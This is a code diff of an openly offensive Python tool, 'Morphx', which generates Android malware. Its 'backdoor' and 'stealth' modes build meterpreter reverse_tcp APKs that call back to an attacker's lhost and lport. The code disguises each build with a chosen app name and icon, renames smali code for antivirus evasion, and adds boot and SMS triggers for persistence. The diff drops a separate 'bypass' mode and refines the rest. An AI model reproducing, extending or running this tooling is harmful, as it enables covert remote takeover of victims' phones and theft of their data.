@@ -1,7 +1,4 @@
 #!/usr/bin/env python3
-"""
-Morphx – Android Payload Generator
-"""
 
 import os, sys, subprocess, shutil, random, string, re, argparse
 from pathlib import Path
@@ -12,21 +9,20 @@ R = "\033[0m"
 BOLD = "\033[1m"
 RED = "\033[31m"
 GREEN = "\033[32m"
-LGREEN = "\033[92m"
 YELLOW = "\033[33m"
 LYELLOW = "\033[93m"
+LGREEN = "\033[92m"
+LBLUE = "\033[94m"
 
 def print_banner():
-    ver = "v2.0"
-    # Simple green block-style banner matching the original bash version
-    print(f"{LGREEN}")
-    print("              __  ___                  __             ")
-    print("             /  |/  /___   ____ ___   / /  __ __       ")
-    print("            / /|_/ // _ \\ / __// _ \\ / _ \\ \\ \\ /        ")
-    print("           /_/  /_/ \\___//_/  / .__//_//_//_\\_\\         ")
-    print("          /_/                /_/                 " + ver)
-    print(f"\033[1;37m                    Coded by Tunisian HxRofo          \033[0m")
-    print(f"{R}")
+    print(f"""{LGREEN}
+              __  ___                  __             
+             /  |/  /___   ____ ___   / /  __ __       
+            / /|_/ // _ \\ / __// _ \\ / _ \\ \\ \\ /        
+           /_/  /_/ \\___//_/  / .__//_//_//_\\_\\         
+          /_/                /_/                 v1.0
+{R}""")
+    print(f"\033[1;37m                    Coded by Tunisian HxRofo          \033[0m\n")
 
 def print_ok(msg: str):    print(f"{GREEN}[✔] {msg}{R}")
 def print_fail(msg: str):  print(f"{RED}[X] {msg}{R}")
@@ -447,21 +443,14 @@ def parse_args():
     backdoor.add_argument("--icon", default=None)
     backdoor.add_argument("--use-aapt2", action="store_true")
 
-    bypass = sub.add_parser("bypass", help="Standalone payload with AV evasion + SMS trigger")
-    bypass.add_argument("--lhost", required=True)
-    bypass.add_argument("--lport", type=int, required=True)
-    bypass.add_argument("--payload", default="android/meterpreter/reverse_tcp")
-    bypass.add_argument("--name", required=True)
-    bypass.add_argument("--icon", required=True)
-    bypass.add_argument("--out", default="payload")
-
-    stealth = sub.add_parser("stealth", help="Stealth persistence payload (boot + SMS trigger)")
+    stealth = sub.add_parser("stealth", help="Stealth persistence payload (AV evasion + boot/SMS trigger)")
     stealth.add_argument("--lhost", required=True)
     stealth.add_argument("--lport", type=int, required=True)
     stealth.add_argument("--payload", default="android/meterpreter/reverse_tcp")
-    stealth.add_argument("--name", required=True)
-    stealth.add_argument("--icon", required=True)
+    stealth.add_argument("--name", required=True, help="App display name")
+    stealth.add_argument("--icon", required=True, help="Path to icon PNG")
     stealth.add_argument("--out", default="payload")
+    stealth.add_argument("--use-aapt2", action="store_true", help="Use aapt2 for rebuild")
 
     return parser.parse_args()
 
@@ -498,37 +487,7 @@ def perform_backdoor(args):
     final = OUTPUT_DIR / f"{args.out}.apk"
     OUTPUT_DIR.mkdir(exist_ok=True)
     sign_apk(built, final)
-    print_ok(f"Backdoored APK saved to {final}")
-    shutil.rmtree(work_dir, ignore_errors=True)
-
-def perform_bypass(args):
-    apktool_cmd = check_all_tools()
-    apktool = Apktool(apktool_cmd)
-    work_dir = SCRIPT_DIR / "morphx_work"
-    work_dir.mkdir(exist_ok=True)
-    raw = work_dir / "payload.apk"
-    gen_payload(args.lhost, args.lport, args.payload, raw)
-
-    print_step("Decompiling payload...")
-    pay_dec = work_dir / "payload_dec"
-    apktool.decompile(raw, pay_dec)
-    print_step("Applying AV evasion + SMS trigger...")
-    smali_rename_standalone(pay_dec, app_label=args.name)
-
-    icon_path = Path(args.icon)
-    if not icon_path.is_absolute():
-        icon_path = INPUT_DIR / icon_path
-    print_step("Injecting icon...")
-    inject_icon(pay_dec, icon_path)
-
-    built = work_dir / "virus.apk"
-    print_step("Rebuilding APK...")
-    apktool.recompile(pay_dec, built)
-
-    final = OUTPUT_DIR / f"{args.out}.apk"
-    OUTPUT_DIR.mkdir(exist_ok=True)
-    sign_apk(built, final)
-    print_ok(f"APK saved to {final}")
+    print_ok(f"Backdoored APK saved to output/{args.out}.apk")
     shutil.rmtree(work_dir, ignore_errors=True)
 
 def perform_stealth(args):
@@ -578,12 +537,12 @@ def perform_stealth(args):
 
     built = work_dir / "virus.apk"
     print_step("Rebuilding APK...")
-    apktool.recompile(pay_dec, built)
+    apktool.recompile(pay_dec, built, use_aapt2=args.use_aapt2)
 
     final = OUTPUT_DIR / f"{args.out}.apk"
     OUTPUT_DIR.mkdir(exist_ok=True)
     sign_apk(built, final)
-    print_ok(f"Stealth APK saved to {final}")
+    print_ok(f"Stealth APK saved to output/{args.out}.apk")
     shutil.rmtree(work_dir, ignore_errors=True)
 
 def main():
@@ -595,8 +554,6 @@ def main():
     args = parse_args()
     if args.mode == "backdoor":
         perform_backdoor(args)
-    elif args.mode == "bypass":
-        perform_bypass(args)
     elif args.mode == "stealth":
         perform_stealth(args)
 
